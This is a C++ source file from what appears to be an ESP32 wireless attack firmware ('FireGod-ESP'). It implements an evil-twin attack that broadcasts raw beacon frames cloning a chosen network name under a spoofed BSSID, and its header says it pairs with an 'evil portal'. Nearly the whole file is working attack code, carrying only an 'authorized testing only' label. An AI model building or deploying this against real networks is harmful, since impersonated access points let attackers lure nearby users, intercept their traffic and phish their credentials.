// ============================================================
// FireGod-ESP — SSID Clone (evil-twin beacon)
// Beacons a single chosen SSID with a fixed spoofed BSSID so the
// network appears in client scan lists. Pairs with evil portal.
// Authorized testing only.
// ============================================================

#include "ssid_clone.h"
#include "fg_globals.h"
#include "core/wifi_manager.h"
#include "wifi_frames.h"
#include <esp_wifi.h>
#include <string.h>

void fg_ssid_clone(const char* ssid, uint8_t channel, bool privacy) {
    if (!ssid || !*ssid) {
        fg_send_result("{\"event\":\"error\",\"msg\":\"ssid_clone requires an SSID\"}");
        return;
    }
    if (channel < 1 || channel > 14) channel = FG_AP_CHANNEL;
    fg_wifi_enter_tx_mode(channel);

    // Fixed spoofed BSSID for the lifetime of this run (stable target).
    uint8_t bssid[6];
    fg_rand_mac(bssid);
    String bs = fg_mac_to_str(bssid);

    fg_send_result_fmt(
        "{\"event\":\"log\",\"msg\":\"Cloning '%s' BSSID %s ch%u %s\"}",
        ssid, bs.c_str(), (unsigned)channel, privacy ? "WPA2" : "OPEN");

    uint8_t frame[160];
    int len = fg_build_beacon(frame, ssid, bssid, channel, privacy);

    uint32_t sent = 0;
    uint32_t lastStat = millis();
    while (!g_stopRequested) {
        // ~10 beacons per 100ms ≈ realistic AP beacon rate, amplified.
        for (int i = 0; i < 10 && !g_stopRequested; i++) {
            fg_wifi_raw_tx(frame, len);
            sent++;
        }
        uint32_t now = millis();
        if (now - lastStat >= 1000) {
            lastStat = now;
            fg_send_result_fmt(
                "{\"event\":\"spam_stats\",\"type\":\"clone\",\"sent\":%lu,\"ch\":%u}",
                (unsigned long)sent, (unsigned)channel);
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    esp_wifi_set_promiscuous(false);
    fg_send_result_fmt(
        "{\"event\":\"scan_complete\",\"type\":\"clone\",\"count\":%lu}",
        (unsigned long)sent);
}
